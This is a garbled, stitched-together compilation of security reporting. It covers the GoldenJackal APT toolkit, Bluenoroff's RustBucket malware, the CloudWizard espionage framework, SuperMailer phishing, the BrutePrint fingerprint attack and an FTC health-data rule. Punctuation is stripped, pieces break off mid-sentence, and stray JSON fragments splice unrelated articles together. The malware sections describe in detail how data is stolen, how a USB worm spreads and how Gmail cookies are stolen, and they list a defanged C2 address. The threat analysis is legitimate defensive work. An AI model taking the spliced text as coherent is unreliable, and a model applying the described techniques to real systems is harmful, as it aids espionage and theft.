serializes the data in an XML encrypts them with DES using a key generated from the ID passed with the -n option and stores the resulting payload in the following location ApplicationDataSNMPcacheFilename where Filename is a GUID generated from an MD5 of the unique identifier specified by the attackerThe malware is usually executed with the 0 or 1 option and the -n option which is used to load the obtained profile ID In the second case it loads the profile from the previously mentioned location and it starts the WatchersA Watcher is an object defined in a class with the same name that runs in a different thread and scans the location according to the specified options The pattern could representWhen the pattern equals all the malware enumerates all logical drives and for each one it creates a new Watcher object When the pattern is usb it listens for system events corresponding to the action of creating a new removable drive on the system When a new drive is detected it creates a new Watcher objectEvery time a new Watcher is added the malware notifies the log of the event and sends the information to the remote C2 using HTTP Post requestsThe log is created using the following string as a templatePath 01rnMasks 2rnExclude 3rnDays 4rnMaxSize 5rnInterval 6And is uploaded inside an encrypted payload that contains the following informationAESKeyAESIVAgentidyyyyMMddHHmmssffflogLog contentThe AESKey and AESIV are generated for each request and are encrypted with the RSA algorithm using a key embedded in the code The resulting payload is also compressed with the GZIP algorithmThe AgentidLogpathlog and the Log content data are encrypted with the AES algorithm and compressed with GZIPThe Watcher objects are responsible for scanning activities When a Watcher starts it enumerates all files in the directory and its subdirectories The scanner can also resolve the lnk links When the scanner detects a file that matches the defined properties mask days max size not in exclusions it calculates the file content hash checks if the resulting value is present in a hash table stored in the local cache directory and adds the value if not present When a new file is detected the malware uploads the file and the related filepath inside an encrypted payload using the same logic described aboveIn this case the encrypted payload contains the following informationAESKeyAESIVAgentidLocalfilepathFile contentThe AgentidLocalfilepath and the File content data are encrypted with the AES algorithm and compressed with GZIPThis worm was developed to spread and infect systems using removable USB drives The program was designed as a flexible tool that can be used to infect systems with any malwareIts behavior changes according to the parent processWhen the malware is working on a system that is already infected and the parent process is taskengexe or servicesexeThe code used to monitor removable USB drives is the same one observed in JackalSteal It creates a ManagementEventWatcher object which allows it to subscribe to event notifications that correspond to a given WQL query and the issuing of a callback upon their interception The query used by the malware instructs the system to check for a logical removable disk creation event every five secondsWhen the malware detects a removable USB storage device it will copy itself onto it The path it will copy to is determined by listing all directories and selecting the one that was modified last It will create a copy of itself on the drive root using the same directory name and change the directorys attribute to hidden This will result in the actual directory being hidden and replaced with a copy of the malware with the directory name Moreover JackalWorm uses an icon mimicking a Windows directory tricking the user into executing the malware when trying to access a directoryIn the following example the removable drive E was infected by the malware which copied itself as Folder1exe and changed the attributes of Folder1 to hide itInfected deviceWhen the malware starts on a clean system and the parent process is explorerexe and the file is located in a removable drive the behavior is as followsThe configuration files are embedded resources that contain XML data that can be used to instruct the worm to perform some actionsA valid configuration file looks like thisIn this case the worm was configured to install the PE file stored in another resource rcdata02 save it with the extension exe and create a scheduled task to run it every 15 minutesOther valid examples areDrops the PE file stored in another resource rcdata02 in TEMPtestexe and executes itExecutes the program WINDIRsystem32pingexe with the argument 1111In our investigations we observed only the first example and the malware was configured to install the JackalControl TrojanIf it fails it tries with a list of hard-coded directory names which is a bit different from the procedure described aboveThe worm maintains its persistence by creating a scheduled task with a hard-coded XML template dynamically modified at runtime Once installed the worm deletes itself from the removable drive by using a batch script The script is dropped in the local Temp directory with a random nameFuture removable drives that are attached will be re-infected with JackalWormIt is also worth mentioning that this tool seems to be under development We deduced this by analyzing the embedded NET resources of the file 5DE309466B2163958C2E12C7B02D8384 Their size is 193973 bytes which is much bigger than their actual contentIt means there are 166770 bytes of unknown data Most of them are part of the legitimate notepadexe Windows utility and specifically the first 0x6A30 bytes were overwritten After the legitimate notepadexe image we found also the following XML configurationsThe first XML shows a new type value scheduler which is not specified in the code The second XML shows that this specific resource was used for testing purposes and the attacker was trying to run cmdexe to write the word TEST in a text file in the desktop USERPROFILEDesktoptesttxtThis malware was developed to collect information about the compromised system as well as a specific set of files that could potentially be used to retrieve stored credentials and the users web activities The attacker named it perinfo a contraction of the programs main class name PersonalInfoContainerIts behaviour changes according to the number of arguments provided during execution Specifically when executed with only one argument the malware collects a predefined set of information and stores it in a binary file compressed with GZIP The filename is specified in the argument provided When executed with two arguments the malware uses the first argument to load a previously generated binary file and extract all the information to a directory specified by the second argumentBy default the program should be executed with one argument Once it is executed the malware starts collecting information about the system using a specific function GetSysInfo which collects the following informationThis specific function was also observed in the first JackalControl variants but was removed from newer variantsThe malware continues its operation by enumerating the logical drives on the system and for each one it enumerates the files in the root path The collected info includes the last write time the filename and the file sizeIt then enumerates the Users directory in the system drive usually CUsers For each user it enumerates the content of the following directoriesIt tries also to acquire the following filesThe malware attempts to steal credentials stored in the victims browser databases as well as other information such as cookies that could be used to gain access to web servicesFinally it serializes the collected information to a binary format compresses all the data with the GZIP algorithm and stores everything in the file specified with the first argument provided by the attackerThis tool is used to collect screenshots of the victims desktop and sends the pictures to a remote hard-coded C2 serverhxxpstahaherbalirwp-includesclass-wp-http-iwr-clientphpThis specific webpage was also used as a C2 for the JackalSteal component indicating that the tools are probably part of a unique frameworkThe malware can handle some arguments that are optional and can be provided as inputThe programs primary function involves running a thread that scans all displays on the system checking their dimensions It then starts an infinite loop periodically checking if the user is active on the system Whenever the malware detects user activity it captures a screenshot and sends it to the remote serverUser activity is detected by monitoring the cursors position and checking if it has changed since the last recorded position After uploading a screenshot it waits for a specified interval before restarting the loopThe screenshots are uploaded inside an encrypted payload using HTTP Post requestsThe encrypted payload is similar to that used by JackalSteal and contains the following informationAESKeyAESIVRemote filenameScreenshotAESKey and AESIV are encrypted with the RSA algorithm using a key embedded in the code The resulting payload is also compressed with the GZIP algorithmThe Remote filename and Screenshot data are encrypted with the AES algorithm and compressed with GZIP The RSA key is the same as that observed in other JackalSteal componentsGoldenJackal activity is characterized by the use of compromised WordPress websites as a method to host C2-related logic We believe the attackers upload a malicious PHP file that is used as a relay to forward web requests to another backbone C2 serverWe dont have any evidence of the vulnerabilities used to compromise the sites However we did observe that many of the websites were using obsolete versions of WordPress and some had also been defaced or infected with previously uploaded web shells likely as a result of low-key hacktivist or cybercriminal activity For this reason we assess that the vulnerabilities used to breach these websites are known ones rather than 0-daysThe remote webpage usually replies with a fake Not Found page The HTTP response status code is 200 but the HTTP body shows a Not found webpageIn specific cases the attacker provides a valid response with a list of commands In those cases the previous body is followed by a long list of standard Windows new line sequences rn and finally the previously mentioned delimiterOver the years we have observed a limited number of attacks against government and diplomatic entities in the Middle East and South Asia We observed victims in Afghanistan Azerbaijan Iran Iraq Pakistan and TurkeyGeography of victimsWe are unable to link GoldenJackal to any known actorDuring our investigations we observed some similarities between GoldenJackal and Turla Specifically we noticed a code similarity in the victim UID generation algorithm that overlaps somewhat with that used by KazuarSpecifically Kazuar gets the MD5 hash of a predefined string and then XORs it with a four-byte unique seed from the machine The seed is obtained by fetching the serial number of the volume where the operating system is installedJackalControl uses an MD5SHIFT algorithm It collects a set of information from the machine including the serial number of the volume where the operating system is installed to generate a unique seed with the MD5 algorithm Then it uses the resulting byte array summing every two consecutive bytes from the resulting MD5 hash and placing the resulting bytes modulus 256 as the sequence that constructs the final BOTIDCode snippet used to generate the BOTIDMoreover the use of tools developed in NET and of compromised WordPress websites as C2 is a common Turla TTPLast but not least the groups share an interest in the same targets and in one specific case we observed that a victim machine was infected with a Turla artifact two months before the GoldenJackal infectionDespite these similarities we assessed with low confidence that there is a connection between GoldenJackal and Turla since neither of these is unique to either threat actor The use of compromised WordPress websites is not a unique TTP This technique was also observed in activity by other groups such as BlackShadow another APT active in the Middle East that uses NET malware The code similarities are related to a single function in a NET program that could be easily copied with a decompiler It is possible that GoldenJackal used that algorithm as a false flag Another hypothesis is that the developers behind JackalControl were inspired by Turla and decided to replicate the UID generation algorithm Finally the shared interest in the same targets is easily explained by the fact that the victims are high-profile targets that could be considered interesting by different actorsGoldenJackal is an interesting APT actor that tries to keep a low profile Despite its long-term activities which are believed to have started in June 2019 this group and the related samples are still generally unknownThe group is probably trying to reduce its visibility by limiting the number of victims According to our telemetry the number of targets is very low and most of them were related to government or diplomatic entities Moreover some of the samples were deployed only on systems that were not protected by Kaspersky during the infection phase This may indicate that the actor is trying to protect some of its tools and avoid specific security solutionsTheir toolkit seems to be under development the number of variants shows that they are still investing in it The latest malware JackalWorm appeared in the second half of 2022 and appears to still be in the testing phase This tool was unexpected because in previous years the attacks were limited to a small group of high-profile entities and a tool like JackalWorm is probably difficult to

        "text": "A relatively unknown advanced persistent threat APT group named 'GoldenJackal' has been targeting government and diplomatic entities in Asia since 2019 for espionageThe threat actors have maintained a low profile for stealthiness carefully selecting their victims and keeping the number of attacks at a minimum to reduce the likelihood of exposureKaspersky has been tracking GoldenJackal since 2020 and today reports that the threat actors have had notable activity in Afghanistan Azerbaijan Iran Iraq Pakistan and TurkeyDespite the fact that they began their activities years ago this group is generally unknown and as far as we know has not been publicly describedAdditionally Kaspersky has seen a case of trojanized 'Skype for Business' installers that drop a trojan alongside a legitimate copy of the softwareWhile Kaspersky's analysts have noticed code and TTP techniques tactics and procedures similarities with Turla they track GoldenJackal as a separate activity clusterAccording to Kaspersky GoldenJackal employs a set of custom NET malware tools that provide various functions including credential dumping data stealing malware loading lateral movement file exfiltration and moreThe primary payload used first to infect a system is 'JackalControl' which gives the attackers remote control over the infected computerThe malware can be run as a program or a Windows service and can establish persistence by adding Registry keys Windows scheduled tasks or Windows servicesIt receives encoded commands from the C2 server via HTTP POST requests which concern the execution of arbitrary programs exfiltration of files or fetching additional payloads from the C2The second tool used by the hackers is 'JackalSteal' an implant devoted to data exfiltration from all logical drives on the compromised computer including remote shares and even newly connected USB drivesThe attackers can execute the stealer with arguments determining the targeted file types paths sizes when files were last used and exclude specific paths that security tools might monitorAll files matching the set parameters are encrypted using AES RSA or DES then compressed with GZIP and eventually transmitted to the C2 serverThe third tool in GoldenJackal's arsenal is 'JackalWorm' which infects USB drives to spread on potentially other valuable computersWhen the malware detects a removable USB storage device it will copy itself onto it reads the Kaspersky reportIt will create a copy of itself on the drive root using the same directory name and change the directory's attribute to hidden This will result in the actual directory being hidden and replaced with a copy of the malware with the directory nameTo obfuscate its nature and trick the victim into executing it 'JackalWorm' uses a Windows directory icon on the removable driveIf that happens the worm will infect the host system establish persistence by creating a scheduled task and then wipe its copy from the USB driveThe fourth tool used by the Golden Jackal APT is 'JacklPerInfo' a basic system information collector with the additional capabilities of identifying and exfiltrating browsing history and credentials stored in web browsersServing like a typical info-stealer malware JacklPerInfo can also exfiltrate files from the Desktop Documents Downloads and AppDataRoamingMicrosoftWindowsRecent directoriesThe fifth and final malware tool presented in Kaspersky's report is the 'JackalScreenWatcher' which is used for snapping screenshots on the infected deviceThe operators can specify the resolution and image-capturing time intervals and the tool will send the media to the C2 via HTTP POST requests in the form of encrypted payloadsIn conclusion GoldenJackal has been carefully using an extensive set of custom tools against a limited number of victims to carry out what Kaspersky believes are long-term espionage operationsAlthough few things are known about the APT's operational tactics the diversity in the observed infection chains combined with highly capable malware tools leaves no doubt that this is a sophisticated threat actor"

        "text": "Combining SuperMailer's customization features and sending capabilities with evasion tactics the threat actors behind the campaign have delivered tailored legitimate-looking emails to inboxes spanning every industry explained Brad Haas cyber threat intelligence analyst at Cofense and author of the researchWhat makes the numbers even more interesting is the fact that SuperMailer is a somewhat obscure German-based newsletter product that has nowhere near the scale of more well-known email generators such as ExpertSender or SendGrid Hass tells Dark Reading yet it's still behind wide swathes of malicious emailsSuperMailer is desktop software that can be downloaded for free or for a nominal fee from a number of sites that may be completely unassociated with the developer he says A free version of SuperMailer was released on CNET in 2019 and since that point has had approximately 1700 downloads This number is low in comparison to many popular software downloads but we do not have any other information on the number of legitimate organizational usersSuperMailer did not immediately respond to Dark Reading's request for comment But since the clients are propagated via third-party websites and have no server or cloud component Haas notes that SuperMailer's metaphorical hands are tied when it comes to rooting out the activityIn the past we've seen large cloud-based services abused to send phishing emails or create unique URL redirects pointing to phishing pages but those services often catch and combat the activity after a period of time he says We do not know the extent to which the SuperMailer developer is capable of fighting this abuseThat in of itself makes SuperMailer attractive to cybercriminals But the other reason is that it offers an attractive disguise for getting past SEGs and ultimately end users thanks to some unique featuresIn this case SuperMailer offers compatibility with several email systems which allows threat actors to spread their sending operation across multiple services this decreases the risk that a SEG or upstream email server will classify emails as unwanted due to reputationThe threat actors likely have access to a variety of compromised accounts and they use SuperMailer's sending features to rotate through them Haas wrote in his report on the threatThe SuperMailer-generated campaigns also take advantage of template customization features like the ability to automatically populate a recipient's name email organization name email reply chains and more all of which boosts the legitimacy of the email for targetsIf a SEG does not follow the redirect it will only check the content or reputation of the legitimate website Haas said in the report Although open redirects are generally considered to be a weakness they can often be found even on high-profile sites For example the campaigns we analyzed used an open redirect on YouTubeCofense has been able to track the SuperMailer activity thanks to a coding mistake that the attackers made while crafting the email templates The emails have all included a unique string showing that they were produced by SuperMailer However parsing messages for that string or more broadly blocking entire legitimate mailing services isn't the answerWe haven't yet uncovered any default characteristics that would allow us to broadly block emails generated by SuperMailer Haas says In this case the identifiable characteristics were discoverable only due to a mistake by the threat actor Without the mistake it wouldn't be feasible as those characteristics are not visible in every SuperMailer emailHowever he notes that there are other characteristics that would identify the emails as potential security threats even without knowing their origin including their content An example would be non-target-specific email reply chains appended to the messagesThis is especially important given that Cofense has discovered that the SuperMailer phishes are part of a larger set of activity that has accounted for a full 14 of phishing emails landing in inboxes in May in the Cofense telemetry Haas explained that all of the emails SuperMailer-sent and the others share certain indicators that tie them all together such as the use of URL randomizationCopyright 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place London SW1P 1WG"

on Bluenoroffs RustBucket a newly observed malware targeting macOS platform Sekoiaio analysts further investigated Bluenoroffs infrastructure and share their findings in this reportIn April 2023 fellow security researchers at Jamf published a report on Bluenoroffs RustBucket a newly observed malware targeting macOS platform Sekoiaio analysts further investigated Bluenoroffs infrastructure and share their findings in this reportSince the end of 2021 and through 2022 Bluenoroff continuously used the same TTPs However Sekoiaio analysts observed recent modifications as described in the report previously referencedThe RustBucket infection chain consists of a macOS installer that installs a backdoored yet functional PDF reader The fake PDF reader then requires opening a specific PDF file that operates as a key to trigger the malicious activity When opened in a classical PDF reader the PDF document displays a message asking the user to open the document in the proper reader ie the backdoored one When opened in this reader the PDF displays a nine pages document about a venture capital company that appears to be the printout of a legit companys website The fake PDF reader uses a hardcoded 100-bytes XOR key to decrypt the new content of the document and the C2 server configurationFigure 1 Key PDF document when opened in a PDF ReaderWhen the proper PDF file is submitted to the fake PDF reader it requests its C2 server encoded in the PDF file using an HTTP POST request to download and execute a new payload The new payload is the backdoor component of the RustBucket kill chain collecting information about the compromised system sending it to its C2 server and requesting for commandsThis new technique is interesting as it makes it more complex to track We need to find the fake readers and the right PDF file to get relevant results from sandboxes While the usage of a modified PDF reader was already observed during Lazarus DreamJob campaign in 2020 it is the first time we observe it to target macOS Sekoiaio analysts created YARA rules and collected new samples complementing Jams findings available in the IOCs sectionDuring our investigation on the macOS variant Sekoiaio analysts identified a NET version of RustBucket with a similar GUI developed using the library DevExpressXtraPdfViewer The malware was embedded in a ZIP archive containing the PDF reader and the key PDF requiring user interactionFigure 2 Windows RustBucket archives contentSimilarly to the RustBucket macOS version when the user opens the PDF file in another PDF reader it opens a one-pager with a message stating the file is protected and must be opened with the internal reader When the file is opened with the fake PDF reader it prints a sixteen pages document containing a list of contactsFigure 3 left Key PDF document opened in Firefox right Key PDF document opened in the Internal PDF viewerDuring our analysis we observed that both Windows and MacOS RustBuckets versions use the same decryption key The executable PdfViewerexe decrypts the malicious PDF and calls the Create function of the DevExpressXpov192dll Library with the C2 url as parameter if a legitimate PDF is chosen an error is returned Cant decrypt PDF file Then two other DLLs are also used to load the backdoor as detailed here above and in Figure 4PdfViewerDevExpressXpov192dllThe purpose of this DLL is

4 Windows RustBucket execution flow chartPivoting on the infrastructure used to deliver RustBucket Sekoiaio analysts retrieved additional infrastructure not exclusively related to the RustBucket activity that we associate to Bluenoroff with high confidence used to deploy other malware through several infection chains These infection chains notably include LNK MSI OneNote and VHD files It is possible Bluenoroff is testing new infection chains and malware before shifting or expanding their TTPsBluenoroffs observed initial intrusion vector includes phishing emails as well as leveraging social networks such as LinkedIn During our investigations we identified the domain sarahbeerydocsendme further analysis led us to the following LinkedIn profileFigure 5 LinkedIn profile allegedly used by BluenoroffAs of the time of writing TDR analysts could no longer find this profile on LinkedIn We assess this likely was a profile used by Bluenoroff after it was leaked to engage with their targets possibly followed up by a delivery of malicious documents through the docsend sharing platformWhile Bluenoroff was seen leveraging updated VHD and CAB files to bypass the Mark-of-the-Web MOTW flag until the end of 2022 Sekoiaio did not observe these TTPs in 2023 It is almost certainly a reflection of Bluenoroffs adaptation efforts after their TTPs were documented in open source notably by Securelist In March 2023 we observed new files MSI file 5c483473641807082e530744023044fd and One Note file 4e05597d308d2368625dc19e86a9ca22 containing similar commands to those used in the VHD files reported by KasperskyThose files were used to drop and execute 529c65521e8a07c8810b6d225f7e2a89 which is a downloader for a curl-agent that Sekoiaio analysts did not retrieve at the time of writingAs per Sekoiaio analysts observations the network infrastructure is used to host HTTPHTTPS services leveraged by lure files This infrastructure is used to download a later stage malware which often is a VBS acting as a backdoor or a curl-agent downloader During their investigation Sekoiaio analysts created automatic trackers to monitor Bluenoroffs infrastructure evolution In previous activities the intrusion set setup HTTPHTTPS servers with specific characteristics used to host a dozen domains notably typosquatting IT financial and investment companiesBased on a TDR heuristic we identified servers used to host domain typo-squatting legitimate organisations notably pertaining to entities involved in fund management and venture fund crypto assets and blockchain located in Europe Asia and North AmericaFigure 6 Financial and technology entities typo-squatted by BluenoroffWhether Bluenoroffs attempt to target these entities or simply masqueraded as those entities to target other individuals and or organizations remains an intelligence gap at the time of writing Regardless Sekoiaio TDR analysts assess this is in line with past Bluenoroffs activities targeting finance-related institutions Based on typosquatting domains and Sekoiaio attributed levels of confidence we identified a strong focus on Asia and the US While this almost certainly stems from the fact that these regions are particularly active in the Fintech area it is also likely part of Bluenoroffs geographical targeting assignment We also retrieved domains indicating a targeting of Laos and ThailandFigure 7 Bluenoroff targets since September 2022Of note we also observed that the group may use temporary C2 servers when testing new techniques that they then discard rapidly For instance in November 2022 Bluenoroff temporarily used a server to transition to using MSI and CAB files 1492824734 Similarly the intrusion set sporadically used a specific server when experimenting with chm Windows Helper files 17286122181 in December 2022Sekoiaio analysts assess this activity is part of Bluenoroffs SnatchCrypto campaign active since 2017 It is in line with past observed malicious cyber activities notably pertaining to Pyongyang strategic objective of revenue generation to evade sanctions Of particular interest are Bluenoroffs observed efforts to develop their offensive capabilities notably including crossplatform languages to their toolset and expanding their victimology through the targeting of multiple environments Sekoiaio analysts assess Bluenoroffs activities will almost certainly continue in the short to medium termSamples first seen date relates to the time they were first submitted to VirusTotal Of note a few samples we identified were tagged as NukeSped in open source likely due to the confusion between Lazarus and Bluenoroff activities At the time of writing Sekoiaio analysts consider NukeSped to be a Lazarus signature malware IOCs provided in Appendix are all

Bluenoroffs infection chainThe classical infection chain observed is ZIP LNK PDFAs part of their phishing activities Bluenoroffs operators send their targets a ZIP archive The archive contains a non-malicious PDF document and a LNK file masquerading as a TXT file purportedly containing a password to read the PDF or masquerading as a PDF reader Launching the LNK file results in downloading a Javascript file from Bluenoroff-controlled C2 server and executing it using mshtaexe The downloaded file is an obfuscated Javascript The obfuscation method is straightforward and consists in encoding some characters in UTF-8 and Hex This script decodes its base64 block writes it in a file tyrbzjs and runs it with a command line containing the C2 domain as argument The base64 encoded part is a script dropped on the computer and executed with the C2 domain as argument The script requests the domain using an HTTP POST request decodes the base64 encoded response and executes it using eval The script attempts to contact the C2 server every 15 seconds and acts as a backdoor allowing the attacker to send commands and scripts to be executed While we identified a few changes in 2023 this

that involved the use of PowerMagic and CommonMagic implants However at the time it was not clear which threat actor was behind the attack Since the release of our report about CommonMagic we have been looking for additional clues that would allow us to learn more about this actor As we expected we have been able to gain a deeper insight into the bad magic storyWhile looking for implants bearing similarities with PowerMagic and CommonMagic we identified a cluster of even more sophisticated malicious activities originating from the same threat actor What was most interesting about it is that its victims were located not only in the Donetsk Lugansk and Crimea regions but also in central and western Ukraine Targets included individuals as well as diplomatic and research organizations The newly discovered campaign involved using a modular framework we dubbed CloudWizard Its features include taking screenshots microphone recording keylogging and moreOur investigation started with telemetry data coming from an active infection with malware running as a suspicious Windows service named syncobjsup This service was controlled by a DLL with an equally suspicious path CProgramDataApparition Storagesyncobjsupdll Upon execution we found this DLL to decrypt data from the file modslrc that is located in the same directory as the DLL The cipher used for decryption was RC5 with the key 88 6A 3F 24 D3 08 A3 85 E6 21 28 45 77 13 D0 38 However decryption of the file with the standard RC5 implementation yielded only junk data A closer look into the RC5 implementation in the sample revealed that it was faultyThe bug is in the inner loop it uses the variable i instead of jWhat is also interesting is that the key from the gist is the same as the one used in the syncobjsupdll libraryThe decrypted file looked to us like a virtual file system VFS containing multiple executables and their JSON-encoded configurationsEach entry in this VFS contains magic bytes CiCi a ROR6 hash of the entry name as well as the entry size and contentsInside modslrc we foundThe syncobjsupdll DLL iterates over VFS entries looking for an entry with the name Main ROR6 hash 0xAA23406F This entry contains CloudWizards Maindll orchestrator library which is reflectively loaded and launched by invoking its SvcEntry exportUpon launching the orchestrator spawns a suspended WmiPrvSEexe process and injects itself into it From the WmiPrvSEexe process it makes a backup of the VFS file copying modslrc to modslrs It then parses modslrs to obtain all the framework module DLLs and their configurations As mentioned above configurations are JSON files with dictionary objectsThe orchestrator itself contains a configuration with parameters such asAfter launching modules the orchestrator starts communicating with the attackers by sending heartbeat messages Each heartbeat is a JSON file with victim information and a list of loaded modulesThis JSON string is encrypted with the cryptography module Cryptondll from the VFS and sent to the attackers with the internet communication module InternetdllIn response to the heartbeats the orchestrator receives commands allowing it to perform module management install start stop delete modules or change their configurations Each command contains magic bytes DE AD BE EF and a JSON string eg Delete Keylogger Screenshot optionally followed by a module DLL fileAs we have mentioned above two modules Cryptondll and Internetdll are bundled with every installation of the CloudWizard framework The Crypton module performs encryption and decryption of all communications It uses two encryption algorithmsThe primary cloud storage is OneDrive while Dropbox and Google Drive are used if OneDrive becomes inaccessible The modules configuration includes OAuth tokens required for cloud storage authenticationAs for the web server endpoint it is used when the module cant access any of the three cloud storages To interact with it it makes a GET request to the URL specified in its configuration getting new commands in response These commands likely include new cloud storage tokensWhile examining the strings of the network module we found a string containing the directory name from the developers machine DProjectsWork2020SoftVersion5RefactoringInformation gathering is performed through auxiliary DLL modules that have the following exported functionsModules can persist upon reboot in this case they are saved in the modslrs VFS file or executed in memory until the machine is shut down or the module is deleted by the operatorIn total we found nine auxiliary modules performing different malicious activities such as file gathering keylogging taking screenshots recording the microphone and stealing passwordsThe module that looked most interesting to us is the one that performs email exfiltration from Gmail accounts In order to steal it reads Gmail cookies from browser databases Then it uses the obtained cookies to access the Gmail web interface in legacy mode by making a GET request to httpsmailgooglecommailuaccount IDuihtmlzyh When legacy mode is accessed for the first time Gmail prompts the user to confirm whether they really wants to switch to legacy mode sending the following webpage in responseIf the module receives such a prompt it simulates a click on the Id like to use HTML Gmail button by making a POST request to a URL from the prompts HTML codeAfter obtaining the CloudWizards orchestrator and its modules we were still missing one part of the infection chain the framework installer While searching through older telemetry data we were able to identify multiple installers that were used from 2017 to 2020 The version of the implant installed at that time was 40 as we wrote above the most recent version we observed is 50Afterwards it creates a service called Windows Subsystem Service that is configured to run the WinSubSvcexe binary on every startupIt is worth noting that the installer displays a message with the text Well done after infectionThis may indicate that the installer we discovered is used to deploy CloudWizard via physical access to target machines or that the installer attempts to mimic a Network Settings as displayed in the window title configuratorThe old 40 and new 50 CloudWizard versions have major differences as outlined in the table belowThe

        "text": "Researchers at Tencent Labs and Zhejiang University have presented a new attack called 'BrutePrint' which brute-forces fingerprints on modern smartphones to bypass user authentication and take control of the deviceBrute-force attacks rely on many trial-and-error attempts to crack a code key or password and gain unauthorized access to accounts systems or networksThe Chinese researchers managed to overcome existing safeguards on smartphones like attempt limits and liveness detection that protect against brute-force attacks by exploiting what they claim are two zero-day vulnerabilities namely Cancel-After-Match-Fail CAMF and Match-After-Lock MALBrutePrint and SPI MITM attacks were tested against ten popular smartphone models achieving unlimited attempts on all Android and HarmonyOS Huawei devices and ten additional attempts on iOS devicesThe idea of BrutePrint is to perform an unlimited number of fingerprint image submissions to the target device until the user-defined fingerprint is matchedContrary to how password cracking works fingerprint matches use a reference threshold instead of a specific value so attackers may manipulate the False Acceptance Rate FAR to increase the acceptance threshold and create matches more easilyBrutePrint stands in between the fingerprint sensor and the Trusted Execution Environment TEE and exploits the CAMF flaw to manipulate the multi-sampling and error-canceling mechanisms of fingerprint authentication on smartphonesCAMF injects a checksum error in the fingerprint data to stop the authentication process at a pre-mature point This allows the attackers to try out fingerprints on the target device while its protection systems won't register failed attempts hence giving them infinite triesThe MAL flaw enables the attackers to infer authentication results of the fingerprint images they try on the target device even if the latter is in lockout modeThe lockout mode is a protection system activated after a certain number of failed consecutive unlock attempts During the lockout timeout the device shouldn't accept unlocking attempts but MAL helps bypass this restrictionThe final component of the BrutePrint attack is using a neural style transfer system to transform all fingerprint images in the database to look like the target device's sensor scanned them This makes the images appear valid and thus have better chances of successThe researchers conducted experiments on ten Android and iOS devices and found that all were vulnerable to at least one flawThe tested Android devices allow infinite fingerprint tryouts so brute-forcing the user's fingerprint and unlocking the device is practically possible given enough timeOn iOS though the authentication security is much more robust effectively preventing brute-forcing attacksAlthough the researchers found that iPhone SE and iPhone 7 are vulnerable to CAMF they could only increase the fingerprint tryout count to 15 which isn't enough to brute-force the owner's fingerprintRegarding the SPI MITM attack that involves hijacking the user's fingerprint image all tested Android devices are vulnerable to it while iPhones are again resistantThe researchers explain that the iPhone encrypts fingerprint data on the SPI so any interception has little value in the context of the attackIn summary the conducted experiments showed that the time it takes to complete BrutePrint against vulnerable devices successfully ranges between 29 and 139 hours when the user has enrolled one fingerprintWhen multiple fingerprints are enrolled on the target device the brute-forcing time drops to just 066 to 278 hours as the likelihood of producing matching images increases exponentiallyAt first glance BrutePrint may not seem like a formidable attack due to requiring prolonged access to the target device However this perceived limitation should not undermine its value for thieves and law enforcementThe former would allow criminals to unlock stolen devices and extract valuable private data freelyThe latter scenario raises questions about privacy rights and the ethics of using such techniques to bypass device security during investigationsThis constitutes a rights violation in certain jurisdictions and could undermine the safety of certain people living in oppressive countries"

        "text": "Developers of consumer-driven health apps and tech can expect more stringent enforcement as the Federal Trade Commission intends to update its Health Breach Notification Rule to clarify language around breach of security user consent language and other functionsThe FTC voted unanimously May 18 to update the HBNR in addition to issuing a policy statement on its intent to combat unfair or deceptive practices tied to the collection use and marketing of consumers biometric information and technologies The risk of biometric tech violations is directly tied to the exposure of the digital identity of consumers and their privacyIn addition to a monetary penalty the app developer is required to make a host of changes to its privacy and security program and inform users of the settlement with FTC The unauthorized disclosures were tied to Premoms use of third-party software development kits SDKs which were among the concerns named during the May 18 hearing as well as the proliferation of telehealth and health appsMore and more companies are involved in the business of collecting health data some of which fall outside the Health Insurance Portability and Accountability Act said Ben Wiseman acting associate director for the division of privacy and identity protection at the FTC said during the meetingBut it doesnt mean that consumers have no privacy protections said Wiseman To the contrary the FTC has wide jurisdiction over companies collecting health data and is committed to safeguarding consumers sensitive health informationLike pixels SDKs are hidden pieces of code and websites and apps that can transfer user information to advertisers Wiseman continued These cases and recent tech guidance make clear that the FTC will scrutinize company's use of this and any technology that transmits consumer sensitive informationWhats more health information encompasses a broader definition than whats detailed in HIPAA Medical data can include data from which a company or tech could infer sensitive health information about an individual Wiseman pointed to consumers visiting or using a mental health treatment serviceWhen their email was disclosed as part of BetterHelps advertising plan it was a disclosure of their health information because it effectively identified them as seeking or receiving mental health treatment he explainedThe commission voted to revise the HBNR to clarify language that could trip up entities interacting with consumer health data including definitions for the rules application to health apps and similar technologies not covered by HIPAA and the definition of PHR identifiable health informationThe FTC also intends to better describe a breach of security under the rule to add the unauthorized acquisition of identifiable health information that occurs as a result of a data security breach or an unauthorized disclosure and improve the rules readability and promote complianceOnce the rule is published in the Federal Register the public will have 60 days to submit comments on these proposed changesThe FTC has grown increasingly concerned over biometric surveillance given the proliferation of technologies such as facial- iris- or fingerprint-recognition tech which collect and process biometric information to identify individuals Biometrics can be used to deduce highly sensitive details about an individual including their demeanorBiometrics raise significant consumer privacy and data security concerns and the potential for bias and discrimination according to the policy noticeSamuel Levine director of the FTCs Bureau of Consumer Protection warned that Todays policy statement makes clear that companies must comply with the law regardless of the technology they are usingTo avoid these pitfalls companies should holistically assess potential harms to consumers before collection of biometrics A third-party should evaluate the particular context in which the technology will be used and consider the role of human operators in addition to other preventable risks to the informationThe policy statement details potential pitfalls for companies leveraging biometrics including descriptions of possible deception means In particular that false or unsubstantiated marketing claims relating to the validity reliability accuracy performance fairness or efficacy of tech using biometric information constitute deceptive practices in violation of the FTC ActAmong the obvious deception elements businesses must not make false or unsubstantiated claims about real-world validity accuracy or performance of biometric information technologies when the claims are based on tests or audits that do not replicate real-world conditions or how the technology will be operationalized by its intended users according to the policy noticeThe law also requires companies to implement reasonable privacy and data security measures the biometric information collected or maintained is protected both internally and externallyThe policy notice details the expectation for biometric use in companies and potential enforcement of these technologies moving forward Developers should review

